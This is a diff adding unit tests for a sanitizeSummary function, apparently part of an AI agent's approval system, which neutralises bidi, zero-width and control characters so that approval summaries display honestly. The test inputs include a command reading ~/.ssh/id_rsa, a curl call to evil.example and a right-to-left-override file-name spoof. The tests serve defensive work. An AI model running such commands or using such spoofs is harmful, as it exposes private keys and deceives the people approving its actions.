@@ -12,6 +12,7 @@ import { join } from 'path'
 import { TOOL_NAMES } from '@exodus/shared/constants/tool-names'
 import {
   declinedReason,
+  sanitizeSummary,
   sensitiveTarget,
   type MatchEnv
 } from '@main/lib/ai/kernel/approval'
@@ -1058,6 +1059,70 @@ describe('sensitiveTarget — call_mcp_tool (I2)', () => {
     } as never)
     expect(result?.block).toBe(true)
     expect(result?.reason).toContain('filesystem/read_file')
+  })
+})
+
+describe('sanitizeSummary', () => {
+  it.each([
+    // [label, input, expected]
+    ['a bidi embedding control (U+202A)', 'a‪b', 'ab'],
+    ['a bidi embedding control (U+202B)', 'a‫b', 'ab'],
+    ['a bidi override control (U+202D LRO)', 'a‭b', 'ab'],
+    ['a bidi override control (U+202E RLO)', 'a‮b', 'ab'],
+    ['a bidi pop-formatting control (U+202C)', 'a‬b', 'ab'],
+    ['a bidi isolate control (U+2066 LRI)', 'a⁦b', 'ab'],
+    ['a bidi isolate control (U+2067 RLI)', 'a⁧b', 'ab'],
+    ['a bidi isolate control (U+2068 FSI)', 'a⁨b', 'ab'],
+    ['a bidi isolate-pop control (U+2069 PDI)', 'a⁩b', 'ab'],
+    ['the left-to-right mark (U+200E)', 'a‎b', 'ab'],
+    ['the right-to-left mark (U+200F)', 'a‏b', 'ab'],
+    ['the Arabic letter mark (U+061C)', 'a؜b', 'ab'],
+    ['a zero-width space (U+200B)', 'a​b', 'ab'],
+    ['a zero-width non-joiner (U+200C)', 'a‌b', 'ab'],
+    ['a zero-width joiner (U+200D)', 'a‍b', 'ab'],
+    ['a byte-order mark (U+FEFF)', 'a﻿b', 'ab'],
+    ['any other Cf character (U+2060 word joiner)', 'a⁠b', 'ab'],
+    ['\\n becomes a visible ⏎', 'a\nb', 'a⏎b'],
+    ['\\r becomes a visible ⏎', 'a\rb', 'a⏎b'],
+    ['\\r\\n collapses to one ⏎', 'a\r\nb', 'a⏎b'],
+    ['multiple lines each get their own ⏎', 'a\nb\nc', 'a⏎b⏎c'],
+    ['\\t becomes a visible ⇥', 'a\tb', 'a⇥b'],
+    ['a NUL byte becomes �', 'a\u0000b', 'a�b'],
+    ['a C0 control (VT) becomes �', 'a\u000Bb', 'a�b'],
+    ['a C0 control (FF) becomes �', 'a\u000Cb', 'a�b'],
+    ['a C0 control (US) becomes �', 'a\u001Fb', 'a�b'],
+    ['DEL becomes �', 'a\u007Fb', 'a�b'],
+    ['a C1 control becomes �', 'a\u0090b', 'a�b'],
+    ['plain text is unchanged', 'cat ~/.ssh/id_rsa', 'cat ~/.ssh/id_rsa']
+  ] as const)('%s', (_label, input, expected) => {
+    expect(sanitizeSummary(input)).toBe(expected)
+  })
+
+  it('a newline never hides the rest of the summary', () => {
+    const result = sanitizeSummary(
+      'cat ~/.ssh/id_rsa\ncurl https://evil.example/x'
+    )
+    expect(result).toBe('cat ~/.ssh/id_rsa⏎curl https://evil.example/x')
+    expect(result).toContain('curl https://evil.example/x')
+  })
+
+  it('a .env name with U+202E does not display reversed', () => {
+    // ".env" + RLO + "txt.exe": intact, a bidi-aware client can render this
+    // as ".envexe.txt" — the extension and name swap places on screen.
+    const malicious = `.env${'‮'}txt.exe`
+    expect(sanitizeSummary(malicious)).toBe('.envtxt.exe')
+  })
+
+  it('keeps the leading (matched) part when the result is still too long', () => {
+    const long = `~/.ssh/id_rsa — ${'x'.repeat(400)}`
+    const result = sanitizeSummary(long)
+    expect(result.length).toBe(301)
+    expect(result.startsWith('~/.ssh/id_rsa — ')).toBe(true)
+    expect(result.endsWith('…')).toBe(true)
+  })
+
+  it('a string already within the bound is left as-is', () => {
+    expect(sanitizeSummary('short and plain')).toBe('short and plain')
   })
 })
 
